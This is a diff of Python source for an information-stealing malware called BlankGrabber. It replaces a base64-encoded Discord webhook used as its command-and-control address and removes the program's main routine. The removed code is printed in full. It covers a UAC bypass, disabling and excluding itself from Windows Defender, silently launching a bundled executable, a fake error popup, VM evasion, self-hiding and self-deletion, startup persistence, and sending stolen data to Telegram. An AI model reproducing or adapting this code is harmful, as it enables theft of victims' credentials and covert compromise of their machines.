@@ -21,7 +21,7 @@ from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warni
 disable_warnings_urllib3()
 
 class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5ODA4MjMxNjA5NDk0MzQxMy9KdGtVdFhVWmpNcUE2dXB3cnYtRTY5dTJraEJoNmtMSmFfZ180dWlUVFYyT0FVbmlUckM4YlQtaWhOTXVKRERTMGd5QQ==').decode())
+    C2 = hook
     Mutex = base64.b64decode('YTQ1c0FuZHBreG5OTE1sZQ==').decode()
     PingMe = bool('')
     Vmprotect = bool('true')
@@ -1365,99 +1365,3 @@ class BlankGrabber:
                 fields.update(payload)
                 fields.update({'chat_id': chat_id})
                 http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
-if os.name == 'nt':
-    Logger.info('Process started')
-    if Settings.HideConsole:
-        Syscalls.HideConsole()
-    if not Utility.IsAdmin():
-        Logger.warning('Admin privileges not available')
-        if Utility.GetSelf()[1]:
-            if not '--nouacbypass' in sys.argv and Settings.UacBypass:
-                Logger.info('Trying to bypass UAC (Application will restart)')
-                if Utility.UACbypass():
-                    os._exit(0)
-                else:
-                    Logger.warning('Failed to bypass UAC')
-                    if not Utility.IsInStartup(sys.executable):
-                        logger.info('Showing UAC prompt')
-                        if Utility.UACPrompt(sys.executable):
-                            os._exit(0)
-            if not Utility.IsInStartup() and (not Settings.UacBypass):
-                Logger.info('Showing UAC prompt to user (Application will restart)')
-                if Utility.UACPrompt(sys.executable):
-                    os._exit(0)
-    Logger.info('Trying to create mutex')
-    if not Syscalls.CreateMutex(Settings.Mutex):
-        Logger.info('Mutex already exists, exiting')
-        os._exit(0)
-    if Utility.GetSelf()[1]:
-        Logger.info('Trying to exclude the file from Windows defender')
-        Utility.ExcludeFromDefender()
-    Logger.info('Trying to disable defender')
-    Utility.DisableDefender()
-    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()) and os.path.isfile((boundFileSrc := os.path.join(sys._MEIPASS, 'bound.blank'))):
-        try:
-            Logger.info('Trying to extract bound file')
-            if os.path.isfile((boundFileDst := os.path.join(os.getenv('temp'), 'bound.exe'))):
-                Logger.info('Old bound file found, removing it')
-                os.remove(boundFileDst)
-            with open(boundFileSrc, 'rb') as file:
-                content = file.read()
-            decrypted = zlib.decompress(content[::-1])
-            with open(boundFileDst, 'wb') as file:
-                file.write(decrypted)
-            del content, decrypted
-            Logger.info('Trying to exclude bound file from defender')
-            Utility.ExcludeFromDefender(boundFileDst)
-            Logger.info('Starting bound file')
-            subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(boundFileDst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-        except Exception as e:
-            Logger.error(e)
-    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
-        try:
-            Logger.info('Showing fake error popup')
-            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
-            message = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
-            icon = int(Settings.FakeError[1][2])
-            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'{}\', 0, \'{}\', {}+16);close()"'.format(message, title, Settings.FakeError[1][2])
-            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-        except Exception as e:
-            Logger.error(e)
-    if not Settings.Vmprotect or not VmProtect.isVM():
-        if Utility.GetSelf()[1]:
-            if Settings.Melt and (not Utility.IsInStartup()):
-                Logger.info('Hiding the file')
-                Utility.HideSelf()
-        elif Settings.Melt:
-            Logger.info('Deleting the file')
-            Utility.DeleteSelf()
-        try:
-            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
-                Logger.info('Trying to put the file in startup')
-                path = Utility.PutInStartup()
-                if path is not None:
-                    Logger.info('Excluding the file from Windows defender in startup')
-                    Utility.ExcludeFromDefender(path)
-        except Exception:
-            Logger.error('Failed to put the file in startup')
-        while True:
-            try:
-                Logger.info('Checking internet connection')
-                if Utility.IsConnectedToInternet():
-                    Logger.info('Internet connection available, starting stealer (things will be running in parallel)')
-                    BlankGrabber()
-                    Logger.info('Stealer finished its work')
-                    break
-                else:
-                    Logger.info('Internet connection not found, retrying in 10 seconds')
-                    time.sleep(10)
-            except Exception as e:
-                if isinstance(e, KeyboardInterrupt):
-                    os._exit(1)
-                Logger.critical(e, exc_info=True)
-                Logger.info('There was an error, retrying after 10 minutes')
-                time.sleep(600)
-        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
-            Logger.info('Deleting the file')
-            Utility.DeleteSelf()
-        Logger.info('Process ended')
